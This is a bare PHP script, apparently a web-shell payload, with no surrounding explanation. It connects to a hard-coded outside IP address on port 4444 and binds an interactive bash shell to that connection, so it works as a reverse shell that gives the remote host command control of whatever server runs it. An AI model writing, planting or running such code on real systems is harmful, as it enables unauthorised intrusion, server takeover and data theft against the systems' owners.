<?php
$ip   = "139.180.210.116";
$port = 4444;

$sock = fsockopen($ip, $port);
if (!$sock) {
    die("Connect failed\n");
}

$proc = proc_open(
    "/bin/bash -i",
    [
        0 => $sock,
        1 => $sock,
        2 => $sock
    ],
    $pipes
);
?>
